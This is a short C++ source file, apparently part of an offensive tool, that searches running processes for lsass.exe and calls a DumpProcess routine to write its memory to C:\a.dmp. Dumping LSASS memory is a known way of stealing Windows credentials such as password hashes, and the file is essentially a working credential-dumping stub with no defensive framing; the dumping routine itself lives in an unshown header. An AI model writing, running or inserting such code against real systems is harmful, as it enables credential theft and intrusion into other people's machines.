#include "exploit.h"

#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>

BOOL g_bVerbose = FALSE;
BOOL g_bDebug = FALSE;
BOOL g_bForce = FALSE;
DWORD g_dwProcessId = 0;
LPWSTR g_pwszDumpFilePath = NULL;
LPWSTR g_pwszProcessName = NULL;


int wmain()
{
    //int argc, wchar_t* argv[]
   // if (!ParseArguments(argc, argv))
   //     return 1;

    std::vector<DWORD> pids;
    std::wstring targetProcessName = L"lsass.exe";
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //all processes
    PROCESSENTRY32W entry; //current process
    entry.dwSize = sizeof entry;

    if (!Process32FirstW(snap, &entry)) { //start with the first in snapshot
        return 0;
    }

    do {
        if (std::wstring(entry.szExeFile) == targetProcessName) {
            pids.emplace_back(entry.th32ProcessID); //name matches; add to list
            g_dwProcessId = entry.th32ProcessID;
            MENUITEMINFO mii = { sizeof(mii) };
            mii.dwTypeData = const_cast<LPTSTR>(TEXT("C:\\a.dmp"));
            DumpProcess(g_dwProcessId, mii.dwTypeData);
        }
    } while (Process32NextW(snap, &entry)); //keep going until end of snapshot

}


